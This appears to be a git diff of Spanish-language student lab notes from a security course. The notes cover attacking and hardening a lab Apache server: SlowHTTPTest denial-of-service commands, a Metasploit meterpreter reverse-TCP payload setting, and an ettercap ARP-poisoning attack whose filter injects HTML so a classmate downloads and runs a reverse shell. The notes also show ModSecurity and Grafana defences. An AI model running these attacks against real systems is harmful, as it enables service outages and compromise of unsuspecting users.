@@ -762,41 +762,6 @@ systemctl restart apache2
 
 ***PROBAR SERVIDOR APACHE CONTRA ATAQUES***
 
-1. Primero comprobamos que nuestro servidor responde:
-```
-curl http://10.11.48.207/
-```
-Si responde se nos mostrara un html por pantalla.
-
-2. Despues realizaremos un ataque SlowHttpTest a dicho servidor ( con el modsecurity desactivado):
-
-Desactivamos el modSecurity:
-
-```
-sudo a2dismod security2
-```
-
-```
-slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.207 -x 24 -p 3
-```
-Mientras esta siendo atacado si intentamos hacemos un curl vemos que no obtenemos respuesta, en cuando paremos el ataque obtendremos respuesta.
-
-3. A continuación activaremos el modSecurity que hemos configurado y reiniciaremos el servicio para ver que tenemos respuesta:
-
-```
-sudo a2enmod security2
-```
-
-Reiniciamos:
-
-```
-sudo a2enmod security2
-```
-
-4. Volvemos a realizar el ataque ( ahora con ModSecurity activado) 
-
-Veremos que en todo momento el servidor nunca deja de responder y si observamos en el atacante vemos que solo han obtenido conexión 50 peticiones de las 1000 que envíamos en el ataque y que 
-las otras 950 han sido cerradas debido a la configuración que hemos hecho en el modsecurity.
 
 
 
@@ -855,7 +820,7 @@ set payload linux/x64/meterpreter_reverse_tcp
 ```
 
 ```
-set lhost 10.11.48.203
+set lhost 10.11.48.207
 ```
 
 ```
@@ -881,6 +846,31 @@ sysinfo
 
 
 **4. Filtro ettercap:**
+
+En el filtro lo que hacemos es meter una accion que al pulsar el boton ejecuta la terminal del shell que usamos en el metasploit.
+
+Lanzamos el ataque contra Alex:
+
+```
+ettercap -Tq -F html.ef -i ens33 -P repoison_arp -M arp:remote /10.11.48.203// /10.11.48.1//
+
+```
+
+Cuando alex hace una peticion w3m contra www.google.es le sale lo de software malicioso, descargar ahora, y al darle a boton deberian descargarse y ejecutar el ./origen_shell.
+
+
+1. Alex mueve el origen shell a su apache var/www/html 
+2. Luego le hago el ataque con el filtro
+
+```
+ettercap -Tq -F html.ef -i ens33 -P repoison_arp -M arp:remote /10.11.48.203// /10.11.48.1//
+````
+
+3. Y Alex hace el w3m www.google.com  y en mi pantalla aparece que el html ha sido inyectado.
+
+
+
+
 
 **5. Transferencia de zona o similar (usc.es):**
 
@@ -980,16 +970,105 @@ Para arrancar el ossec:
 
   
 **8. Ataque DOS:**
+En el apache cargamos la reglas OWASP y ademas limitamos las conexiones a 50 en el security.conf
+
+
+```
+nano /etc/apache2/mods-enabled/security2.conf
+```
+Añadimos limitacion de conexiones a 50.
+
+```
+nano /etc/modsecurity/modsecurity.conf
+```
+
+
+```
+sudo a2dismod security2
+```
+
+```
+systemctl restart apache2
+```
+
+```
+sudo a2enmod security2
+```
+
+Para el ataque POST de Grafana sin proteger hacerlo con 8000 conexiones y 400 por segundo, para que en network trafico 
+pase de los 100kb/s, em grafana poner que se actualice los ultimos 5 minutos y cada 10 segundos.
+Con ese ataque llego a network traffic 110kb/s
+
+```
+slowhttptest -c 8000 -H -g -o slowhttp -i 10 -r 400 -t GET -u http://10.11.48.207 -x 24 -p 3
+```
+
+
+Con security activado:
+Solo deja conectar 50 y no lelga a subir el network traffic manteniendose estable todo el rato.
+
+
 
 **9. Mod_Security:**
+
+1. Primero comprobamos que nuestro servidor responde:
+```
+GET  http://10.11.48.207
+```
+Si responde se nos mostrara un html por pantalla.
+
+2. Despues realizaremos un ataque SlowHttpTest a dicho servidor ( con el modsecurity desactivado):
+
+Desactivamos el modSecurity:
+
+```
+sudo a2dismod security2
+```
+
+```
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.11.48.207 -x 24 -p 3
+```
+Mientras esta siendo atacado si intentamos hacemos un curl vemos que no obtenemos respuesta, en cuando paremos el ataque obtendremos respuesta.
+
+3. A continuación activaremos el modSecurity que hemos configurado y reiniciaremos el servicio para ver que tenemos respuesta:
+
+```
+sudo a2enmod security2
+```
+
+Reiniciamos:
+
+```
+sudo a2enmod security2
+```
+
+4. Volvemos a realizar el ataque ( ahora con ModSecurity activado) 
+
+Veremos que en todo momento el servidor nunca deja de responder y si observamos en el atacante vemos que solo han obtenido conexión 50 peticiones de las 1000 que envíamos en el ataque y que las otras 950 han sido cerradas debido a la configuración que hemos hecho en el modsecurity.
+
 
 **10. Grafana ( Dashboard 159):**
 
 Cuando se ataque al server con un ataque de tipo POST el network tiene que superar los 100kb/s
 
+URL grafana:
 
+```
+http://10.11.48.207:3000/
+```
+URL prometheus:
 
+```
+http://10.11.48.207:9090/
+```
 
+```
+systemctl status prometheus
+```
+
+```
+systemctl status grafana-server
+```
 
 
 
